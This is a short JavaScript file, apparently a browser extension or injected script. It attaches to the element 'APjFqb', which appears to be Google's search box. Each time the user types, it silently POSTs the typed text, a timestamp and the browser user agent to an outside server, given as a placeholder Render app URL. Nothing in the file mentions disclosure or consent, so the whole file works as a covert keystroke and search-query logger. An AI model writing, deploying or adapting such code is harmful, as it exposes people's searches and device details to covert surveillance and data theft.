const textarea = document.getElementById("APjFqb");
console.log("text.js loaded");
console.log(document.getElementById("APjFqb"));

if (textarea) {
  textarea.addEventListener("input", () => {
    fetch("https://YOUR-RENDER-APP.onrender.com/input", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        text: textarea.value,
        time: Date.now(),
        ua: navigator.userAgent
      })
    });
  });
}
